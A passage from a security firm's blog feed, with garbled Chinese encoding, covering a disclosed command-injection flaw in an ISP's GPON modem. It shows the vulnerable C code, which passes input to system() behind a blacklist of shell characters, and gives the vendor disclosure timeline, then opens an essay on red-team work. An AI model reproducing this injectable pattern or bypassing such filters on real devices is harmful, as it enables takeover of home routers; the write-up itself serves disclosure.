highlighter-rouge&quot;&gt;system&lt;/code&gt; å‰æœƒå…ˆæ ¹æ“š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; çš„åˆ—è¡¨æª¢æŸ¥æ˜¯å¦å­˜åœ¨æœ‰å®³å­—å…ƒã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;util_trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;util_fdprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;invalid char &apos;%c&apos; in command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/tmpfile.%d.%06ld&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/diag %s &amp;gt; %s 2&amp;gt;/dev/null&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;è€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; å®šç¾©å¦‚ä¸‹:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|&amp;lt;&amp;gt;(){}`;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœæ˜¯ä½ çš„è©±ï¼Œèƒ½æƒ³åˆ°å¦‚ä½•ç¹éå—?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ç­”æ¡ˆå¾ˆç°¡å–®ï¼Œå‘½ä»¤æ³¨å…¥å¾€å¾€å°±æ˜¯é€™éº¼çš„ç°¡å–®ä¸”æ¨¸å¯¦ç„¡è¯!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;é€™è£¡æˆ‘å€‘ç¤ºç¯„äº†å¦‚ä½•å¾ PTT çŸ¥é“å—å®³è€… IP åœ°å€ï¼Œåˆ°é€²å…¥å®ƒæ•¸æ“šæ©Ÿå¯¦ç¾çœŸæ­£æ„ç¾©ä¸Šçš„ã€ŒæŒ‡å“ªæ‰“å“ªã€!&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Pq00YUoBOsQ&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h2&gt;

&lt;p&gt;æ•…äº‹åˆ°é€™é‚Šå·®ä¸å¤šé€²å…¥å°¾è²ï¼Œæ•´ç¯‡æ–‡ç« çœ‹ä¼¼è¼•ææ·¡å¯«ï¼Œæè¿°ä¸€å€‹æ¼æ´å¾ç™¼ç¾åˆ°åˆ©ç”¨çš„æ•´å€‹ç¶“éï¼Œå¾çµæœè«–ä¾†èªªä¹Ÿè¨±åªæ˜¯ä¸€å€‹ç°¡å–®çš„å‘½ä»¤æ³¨å…¥ï¼Œä½†å¯¦éš›ä¸Šä¸­é–“æ‰€èŠ±çš„æ™‚é–“ã€èµ°éçš„æ­ªè·¯æ˜¯æ­£åœ¨è®€æ–‡ç« çš„ä½ ç„¡æ³•æƒ³åƒçš„ï¼Œå°±åƒæ˜¯åœ¨é»‘æš—ä¸­èµ°è¿·å®®ï¼Œåœ¨æ²’æœ‰èµ°å‡ºè¿·å®®å‰æ°¸é ä¸æœƒçŸ¥é“è‡ªå·±æ­£åœ¨èµ°çš„é€™æ¢è·¯æ˜¯ä¸æ˜¯é€šå¾€ç›®çš„æ­£ç¢ºé“è·¯!&lt;/p&gt;

&lt;p&gt;æŒ–æ˜å‡ºæ–°çš„æ¼æ´ï¼Œä¸¦ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ï¼Œå°¤å…¶æ˜¯åœ¨å„å¼æ”»æ“Šæ‰‹æ³•åˆå·²è¶¨æ–¼æˆç†Ÿçš„ä»Šå¤©ï¼Œè¦æƒ³å‡ºå…¨æ–°çš„æ”»æ“Šæ‰‹æ³•æ›´æ˜¯é›£ä¸ŠåŠ é›£! åœ¨æ¼æ´ç ”ç©¶çš„é ˜åŸŸä¸Šï¼Œå°ç£å°šæœªæ“æœ‰è¶³å¤ çš„èƒ½é‡ï¼Œå¦‚æœå¹³å¸¸çš„æŒ‘æˆ°å·²ç¶“æ»¿è¶³ä¸äº†ä½ ï¼Œæƒ³é«”é©—çœŸå¯¦ä¸–ç•Œçš„æ”»é˜²ï¼Œæ­¡è¿åŠ å…¥èˆ‡æˆ‘å€‘ä¸€èµ·äº¤æµè•‰æµ :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;é€šå ±æ™‚ç¨‹&quot;&gt;é€šå ±æ™‚ç¨‹&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2019 å¹´ 07 æœˆ 28 æ—¥ - é€é TWCERT/CC å›å ±ä¸­è¯é›»ä¿¡&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 08 æœˆ 14 æ—¥ - å» å•†å›è¦†æ¸…æŸ¥ä¸¦ä¿®è£œè¨­å‚™ä¸­&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 08 æœˆ 27 æ—¥ - å» å•†å›è¦†ä¹æœˆåˆä¿®è£œå®Œç•¢&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 08 æœˆ 30 æ—¥ - å» å•†å›è¦†å·²å®Œæˆå—å½±éŸ¿è¨­å‚™çš„éŸŒé«”æ›´æ–°&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 09 æœˆ 11 æ—¥ - å» å•†å›è¦†éƒ¨åˆ†ç”¨æˆ¶éœ€æ´¾å“¡æ›´æ–°, å»¶å¾Œå…¬é–‹æ™‚é–“&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 09 æœˆ 23 æ—¥ - èˆ‡ TWCERT/CC ç¢ºèªå¯å…¬é–‹&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 09 æœˆ 25 æ—¥ - ç™¼è¡¨è‡³ DEVCORE CONFERENCE 2019&lt;/li&gt;
  &lt;li&gt;2019 å¹´ 11 æœˆ 11 æ—¥ - éƒ¨è½æ ¼æ–‡ç« é‡‹å‡º&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE/</link>
                <guid>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE</guid>
                <pubDate>Mon, 11 Nov 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE ç´…éšŠçš„é€²åŒ–ï¼Œèˆ‡ä¸‹ä¸€æ­¥</title>
                <description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;ã€Œç´…éšŠæ¼”ç·´ã€è¿‘å¹´ä¾†æ¼¸æ¼¸é–‹å§‹è¢«å¤§å®¶æåŠï¼Œä¹Ÿé–‹å§‹æœ‰ä¸€äº›å» å•†æ¨å‡ºç´…éšŠæœå‹™ã€‚ä¸éé—œæ–¼åœ¨å°ç£ç´…éšŠæ˜¯æ€éº¼åšçš„å°±æ¯”è¼ƒå°‘äººå…¬é–‹åˆ†äº«ï¼Œèº«ç‚ºç¬¬ä¸€å€‹åœ¨å°ç£æ¨ç´…éšŠæ¼”ç·´çš„å…¬å¸ï¼Œæˆ‘æƒ³å°±æ ¹æ“šé€™å…©å¹´å¤šä¾†çš„å¯¦æˆ°ç¶“é©—ï¼Œåˆ†äº«ç‚ºä»€éº¼æˆ‘å€‘è¦åšç´…éšŠã€æˆ‘å€‘é¢è‡¨åˆ°çš„å•é¡Œã€ä»¥åŠåœ¨æˆ‘å€‘å¿ƒä¸­èªç‚ºç´…éšŠæˆå“¡æ‡‰è©²å…·å‚™çš„ç‰¹è³ªã€‚æœ€å¾Œå†åˆ†äº«æˆ‘å€‘ç¾éšæ®µçœ‹åˆ°çš„ä¼æ¥­è³‡å®‰å•é¡Œï¼ŒæœŸæœ›æœªä¾†æˆ‘å€‘ä¹Ÿå¯ä»¥é€éç´…éšŠæ¼”ç·´ä¾†å¹«åŠ©ä¼æ¥­è£œè¶³é‚£äº›å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;é€™ä¸€ç¯‡æ˜¯æˆ‘åœ¨ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; æ‰€åˆ†äº«çš„ä¸»é¡Œã€‚ç ”è¨æœƒäº‹å‰èª¿æŸ¥æƒ³è½å…§å®¹æ™‚æœ‰äº›æœ‹å‹å¸Œæœ›æˆ‘å€‘èƒ½ä»‹ç´¹ DEVCORE çš„ç´…éšŠï¼Œé‚„æœ‰é‹ä½œæ–¹å¼å’Œæ¡ˆä¾‹ï¼Œæ‰€ä»¥æˆ‘æŠ½å‡ºä¸€äº›ç´ ææ•´ç†æˆé€™å ´æ¼”è¬›ã€‚ä¸‹é¢æ˜¯æŠ•å½±ç‰‡é€£çµï¼Œå…¶ä¸­æœ‰äº›å…§éƒ¨ç³»çµ±ç•«é¢ä¸å°å¤–å…¬é–‹ï¼Œåƒ…åœ¨ç ”è¨æœƒåˆ†äº«æ•¬è«‹è¦‹è«’ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/conf/2019/slides/devcore-conf-2019-shaolin-DEVCORE%20%E7%B4%85%E9%9A%8A%E7%9A%84%E9%80%B2%E5%8C%96%EF%BC%8C%E8%88%87%E4%B8%8B%E4%B8%80%E6%AD%A5.pdf&quot;&gt;DEVCORE ç´…éšŠçš„é€²åŒ–ï¼Œèˆ‡ä¸‹ä¸€æ­¥ ï¼ Shaolin (DEVCORE CONF 2019)&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;ç‚ºä»€éº¼è¦ç´…éšŠæ¼”ç·´&quot;&gt;ç‚ºä»€éº¼è¦ç´…éšŠæ¼”ç·´ï¼Ÿ&lt;/h2&gt;

&lt;p&gt;ä¸€è¨€ä»¥è”½ä¹‹ï¼Œå°±æ˜¯æˆ‘å€‘æ¼¸æ¼¸é«”æœƒåˆ°ï¼š&lt;strong&gt;å°å¤§ä¼æ¥­è€Œè¨€ï¼Œå–®ç´”çš„æ»²é€æ¸¬è©¦ä¸¦ä¸æ˜¯æœ€æœ‰æ•ˆç›Šçš„&lt;/strong&gt;ã€‚å¾éå»ä¸Šç™¾æ¬¡æ»²é€æ¸¬è©¦ç¶“é©—ä¸­ï¼Œæˆ‘å€‘å¾€å¾€èƒ½åœ¨å°ˆæ¡ˆåˆæœŸçš„åµæŸ¥éšæ®µï¼Œç™¼ç¾ä¼æ¥­é‚Šç•Œå­˜åœ¨åš´é‡å¼±é»ï¼Œé€²è€Œé€²å…¥å…§ç¶²ç¹éå±¤å±¤é˜²ç¦¦æ”»æ“Šä¸»è¦ç›®æ¨™ã€‚è¶Šæ˜¯é¾å¤§çš„ä¼æ¥­ï¼Œé€™ç¨®ç‹€æ³æœƒè¶Šæ˜é¡¯ï¼Œå› ç‚ºä»–å€‘é€šå¸¸æœ‰å¾ˆå¤šå°å¤–çš„ç¶²ç«™ã€ç¶²è·¯è¨­å‚™ï¼Œæ¯ä¸€å€‹éƒ½å¯èƒ½æ˜¯é¢¨éšªï¼Œå³ä½¿ä¸»è¦ç¶²ç«™é˜²è­·å¾ˆå®Œå‚™ï¼Œé§­å®¢åªéœ€è¦å¾é€™éº¼å¤šç›®æ¨™ä¸­æ‰¾åˆ°ä¸€å€‹å•é¡Œï¼Œå°±å¯ä»¥å°ä¼æ¥­é€ æˆå‚·å®³ã€‚ä»Šå¤©å°±ç®—ä¼æ¥­å°æ¯å€‹æœå‹™éƒ½ç¨ç«‹åšäº†ä¸€æ¬¡æ»²é€æ¸¬è©¦ï¼Œåœ¨çœŸå¯¦ä¸–ç•Œä¸­ï¼Œé‚„æ˜¯æœ‰å¯èƒ½å¾ç¬¬ä¸‰æ–¹æœå‹™ã€å» å•†ä¾›æ‡‰éˆã€ç¤¾äº¤å·¥ç¨‹ç­‰é€”å¾‘å…¥ä¾µã€‚æ‰€ä»¥æœ‰å¯èƒ½æŠ•æ³¨å¾ˆå¤šè³‡æºåšæ¸¬è©¦ï¼Œçµæœé‚„æ˜¯ç™¼ç”Ÿè³‡å®‰äº‹ä»¶ã€‚&lt;/p&gt;

&lt;p&gt;æ–¼æ˜¯ï¼Œæˆ‘å€‘æ¨å‡ºäº†ç´…éšŠæ¼”ç·´ï¼Œå¸Œæœ›é€éçœŸå¯¦çš„æ¼”ç·´å¹«åŠ©ä¼æ¥­æ‰¾åˆ°æ•´é«”æ¶æ§‹ä¸­è„†å¼±çš„åœ°æ–¹ã€‚å› æ­¤ï¼Œé€™å€‹æœå‹™é—œæ³¨çš„æ˜¯&lt;strong&gt;ä¼æ¥­æ•´é«”çš„å®‰å…¨æ€§&lt;/strong&gt;ï¼Œè€Œä¸å†åªæ˜¯å–®ä¸€çš„ç¶²ç«™ã€‚&lt;/p&gt;

&lt;p&gt;ç´…éšŠæ¼”ç·´ç›®æ¨™é€šå¸¸æ˜¯ä¸€å€‹æƒ…å¢ƒï¼Œä¾‹å¦‚ï¼šé§­å®¢æœ‰æ²’æœ‰è¾¦æ³•å–å¾—æ°‘çœ¾å€‹è³‡ç”šè‡³æ˜¯ä¿¡ç”¨å¡å¡è™Ÿï¼Ÿåœ¨æ¼”ç·´éç¨‹ä¸­ç´…éšŠæœƒç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„å˜—è©¦é©—è­‰ä¼æ¥­åœ¨ä¹çš„æƒ…å¢ƒæœ‰æ²’æœ‰å¯èƒ½ç™¼ç”Ÿã€‚ä»¥å‰›å‰›çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘æœƒæƒ³è¾¦æ³•æ‰¾åˆ°ä¸€æ¢è·¯å¾‘å–å¾—å­˜æ”¾é€™äº›è¨Šæ¯çš„è³‡æ–™åº«ï¼Œå»é©—è­‰æœ‰æ²’æœ‰è¾¦æ³•å–å¾—å€‹è³‡åŠå¡è™Ÿã€‚ä¸€èˆ¬ä¾†èªªï¼Œå¡è™Ÿéƒ¨åˆ†éƒ½æœƒç¶“éåŠ å¯†ï¼Œå› æ­¤åœ¨æ‹¿ä¸‹è³‡æ–™åº«å¾Œæˆ‘å€‘ä¹Ÿæœƒå˜—è©¦çœ‹çœ‹æœ‰æ²’æœ‰è¾¦æ³•é‚„åŸé€™äº›å¡è™Ÿã€‚æœ‰æ™‚å€™é™¤äº†æ‰¾åˆ°é‚„åŸçš„æ–¹æ³•ï¼Œæˆ‘å€‘ç”šè‡³æœƒåœ¨éç¨‹ä¸­ç™¼ç¾å…¶ä»–è·¯å¾‘å¯å–å¾—å¡è™Ÿï¼Œå¯èƒ½æ˜¯å·¥ç¨‹å¸«çš„ debug è³‡è¨Šæœƒè¨˜éŒ„å¡è™Ÿï¼Œæˆ–æ˜¯å‚™ä»½æª”åœ¨ NAS è£¡é¢æœ‰å®Œæ•´å¡è™Ÿï¼Œé€™äº›å¯èƒ½æ˜¯é€£è³‡å®‰è² è²¬äººéƒ½ä¸çŸ¥é“çš„è³‡è¨Šï¼Œä¹Ÿæ˜¯ä¼æ¥­è©•ä¼°é¢¨éšªçš„ç›²é»ã€‚&lt;/p&gt;

&lt;p&gt;åˆ°é€™é‚Šï¼Œç´…éšŠæ¼”ç·´çš„æ•ˆç›Šå°±å¾ˆæ˜é¡¯äº†ï¼Œç´…éšŠèƒ½å”åŠ©ä¼æ¥­å…¨ç›¤è©•ä¼°æ½›åœ¨çš„é‡å¤§é¢¨éšªï¼Œä¸å†åƒéå»åªæ˜¯å–®ä¸€é¢å‘çš„æ¸¬è©¦ç‰¹å®šç¶²ç«™ã€‚é™¤äº†æ‰¾åˆ°å¼±é»ï¼Œç´…éšŠæ›´åœ¨ä¹å¹«ä¼æ¥­&lt;strong&gt;é©—è­‰å…¥ä¾µçš„å¯è¡Œæ€§&lt;/strong&gt;ï¼Œæ–¹ä¾¿ä¼æ¥­è©•ä¼°é¢¨éšªä»¥åŠæ“¬å®šé˜²ç¦¦ç­–ç•¥ã€‚æœ€å¾Œï¼Œç´…éšŠå¾€å¾€ä¹Ÿèƒ½å¤ åœ¨æ¼”ç·´éç¨‹ç•¶ä¸­&lt;strong&gt;æ‰¾å‡ºä¼æ¥­é¢¨éšªè©•ä¼°å¿½ç•¥çš„åœ°æ–¹&lt;/strong&gt;ï¼Œä¾‹å¦‚å‰›å‰›ä¾‹å­æåˆ°çš„å‚™ä»½ NASï¼Œå°±å¯èƒ½æ˜¯æ²’æœ‰åˆ—å…¥æ ¸å¿ƒç³»çµ±ä½†åˆç›¸ç•¶é‡è¦çš„ä¼ºæœå™¨ï¼Œé€™ä¸€å¡Šä¹Ÿæ˜¯ DEVCORE é€™å¹¾å¹´ä¾†ç¢ºå¯¦å¹«åŠ©åˆ°å®¢æˆ¶çš„åœ°æ–¹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;devcore-ç´…éšŠçš„ç·¨åˆ¶&quot;&gt;DEVCORE ç´…éšŠçš„ç·¨åˆ¶&lt;/h2&gt;

&lt;p&gt;åŸºæœ¬ä¸Šï¼ŒDEVCORE çš„ç´…éšŠæˆå“¡éƒ½æ˜¯å¯ä»¥ç¨ç•¶ä¸€é¢çš„ï¼Œåœ¨åŸ·è¡Œä¸€èˆ¬å°ˆæ¡ˆæ™‚æˆå“¡é–“ä¸¦æ²’æœ‰é¡¯è‘—å·®ç•°ã€‚ä½†åœ¨æ¼”ç·´ç¯„åœæ¯”è¼ƒå¤§çš„ç‹€æ³ä¸‹ï¼Œå°±æœƒé–‹å§‹æœ‰æ˜é¡¯çš„åˆ†å·¥ä½œæ¥­ï¼Œå„çµ„ä¹Ÿæœƒå°ˆç²¾æŠ€èƒ½å¢åŠ åœ˜éšŠæ•ˆç‡ã€‚ç›®å‰æˆ‘å€‘çš„ç·¨åˆ¶å…±åˆ†ç‚ºäº”çµ„ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç°¡å–®ä»‹ç´¹è·è²¬å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
